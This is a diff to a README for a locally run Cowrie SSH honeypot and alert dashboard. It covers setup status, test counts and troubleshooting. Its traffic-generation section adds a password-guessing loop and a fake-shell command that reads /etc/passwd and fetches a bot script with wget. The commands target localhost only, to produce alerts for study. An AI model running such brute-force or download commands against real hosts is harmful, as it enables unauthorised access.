@@ -3,11 +3,10 @@
 Run the whole framework locally with Docker: a real Cowrie SSH honeypot, the
 log ingestor, the RBAC-protected alert API, and the Nightwatch dashboard.
 
-> **Status:** the Compose stack and its Dockerfiles are authored but have not
-> been built end-to-end by the maintainer (no Docker on the dev machine). If
-> you hit a build error, please open an issue — the individual pieces are
-> tested (`pytest`, `npm run build`) but the assembled stack is not yet
-> verified. See [Without Docker](#without-docker) for the parts that are.
+> **Status:** CI builds and starts this stack on every push and checks health,
+> login, auth and the dashboard proxy. The full capture path (SSH into Cowrie,
+> alert in the API, playbook fires) has also been run end to end on Docker in
+> WSL2. If you hit a build error, please open an issue.
 
 ## 1. Configure
 
@@ -68,16 +67,28 @@ do, the dashboard shows clearly-labeled demo data rather than live alerts.
 
 ## 4. Generate some attacks
 
-Without a public IP you won't get real attackers, so drive traffic yourself:
+Without a public IP you won't get real attackers, so drive traffic yourself.
+Cowrie's default user list rejects `root` with the password `123456` or `root`
+and lets `root` in with almost anything else. A rejected guess becomes an
+`SSHBruteForce` alert. An accepted one drops you into Cowrie's *fake* shell,
+where every command you type becomes an alert.
 
 ```bash
-# Brute-force the honeypot; each attempt becomes an alert
-for i in $(seq 1 10); do
-  sshpass -p "wrong$i" ssh -o StrictHostKeyChecking=no \
-    -o PreferredAuthentications=password \
-    -p 2222 root@localhost 2>/dev/null
+SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+  -o PreferredAuthentications=password -o PubkeyAuthentication=no"
+
+# Rejected guesses -> SSHBruteForce (and the brute-force playbook fires)
+for pw in 123456 root; do
+  sshpass -p "$pw" ssh $SSH_OPTS -p 2222 root@localhost true
 done
+
+# Accepted login -> HoneypotLoginSuccess, then one alert per command
+sshpass -p 'hunter2' ssh $SSH_OPTS -p 2222 root@localhost \
+  'uname -a; cat /etc/passwd; wget http://example.com/bot.sh'
 ```
+
+Or do it by hand, which is more convincing to watch: `ssh -p 2222
+root@localhost`, type a password, and run a few commands in the fake shell.
 
 Then watch alerts arrive:
 
@@ -100,9 +111,9 @@ pip install -r requirements.txt -r requirements-dev.txt
 cp .env.example .env
 python3 -c "import secrets; print('JWT_SECRET_KEY=' + secrets.token_urlsafe(32))" >> .env
 
-pytest                          # 91 tests
+pytest                          # 123 tests
 ruff check .                    # lint
-cd frontend && npm ci && npm run build && npm test   # 31 tests
+cd frontend && npm ci && npm run build && npm test   # 67 tests
 ```
 
 To actually serve the API without Docker (e.g. to drive traffic at it with
@@ -132,9 +143,11 @@ there is deliberately no default.
 **Dashboard shows demo data** — you haven't set a token (step 3), or the API
 is unreachable. Check `curl http://localhost:8000/health`.
 
-**No alerts appearing** — confirm Cowrie is writing:
-`docker compose exec cowrie ls -l /cowrie/cowrie-git/var/log/cowrie/`, then
-check the ingestor: `docker compose logs ingestor`. The ingestor starts
+**No alerts appearing** — confirm Cowrie is writing its JSON log. The Cowrie
+image has no shell, so look from the ingestor, which mounts the same volume:
+`docker compose exec ingestor ls -l /honeypot-logs/`. Then check the
+ingestor: `docker compose logs ingestor`. Cowrie's own text log goes to
+stdout: `docker compose logs cowrie`. The ingestor starts
 tailing at end-of-file, so only activity *after* it starts becomes an alert.
 
 **"database is locked"** — the API and ingestor share one SQLite file. WAL
